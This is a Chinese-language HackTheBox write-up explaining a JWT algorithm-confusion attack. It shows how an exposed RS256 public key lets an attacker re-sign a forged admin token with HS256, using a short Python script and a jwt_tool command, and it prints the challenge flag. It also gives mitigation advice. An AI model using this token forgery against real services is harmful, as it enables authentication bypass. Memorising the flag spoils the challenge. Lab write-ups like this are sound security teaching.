---
layout: writeup
lang: zh
title: "HackTheBox - Under Construction (JWT 算法混淆)"
description: "JWT 算法混淆攻击。服务器接受使用公钥验证的 RS256 令牌，攻击者可将其改为 HS256 并以该公钥作为 HMAC 密钥重新签名，从而伪造管理员令牌。"
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
date: 2026-01-22
permalink: /zh/ctf-writeups/htb-web-under-construction/
---

## 题目信息

**平台：** HackTheBox
**类别：** Web
**难度：** Medium

## 侦察

登录后应用返回一个 JWT。解码 header 后看到 `"alg": "RS256"`，即非对称签名（私钥签名，公钥验证）。

公钥直接暴露在 `/static/jwks.json`，这是关键发现。

## 攻击原理

RS256 是非对称算法：用私钥签名，用公钥验证。HS256 是对称算法：同一密钥用于签名和验证。漏洞在于服务器没有强制限定算法类型：

1. 从 `/static/jwks.json` 获取公钥
2. 将 token header 中的 `alg` 改为 `HS256`
3. 用公钥作为 HMAC 密钥，对修改后的 payload 重新签名

服务器验证时，取出用于验证的密钥（即公钥）作为 HS256 的密钥，最终接受伪造的 token。

## 利用代码

```python
import jwt

pub_key = """-----BEGIN PUBLIC KEY-----
<key from jwks.json>
-----END PUBLIC KEY-----"""

payload = {
    "username": "admin",
    "pk": pub_key,
    "iat": 1700000000
}

forged = jwt.encode(payload, pub_key, algorithm="HS256")
print(forged)
```

将伪造的 token 放入 `Authorization` 头，成功获得管理员权限和 flag。

## Flag

```
HTB{d0n7_3xp053_y0ur_publ1ck3y}
```

## 总结

- 公钥暴露是这个攻击成立的前提，公钥不公开则难度大幅上升
- 服务器应强制指定允许的算法，绝不能信任 token header 中自声明的算法
- `jwt_tool` 可以自动化此攻击：`python3 jwt_tool.py <token> -X k -pk public.pem`
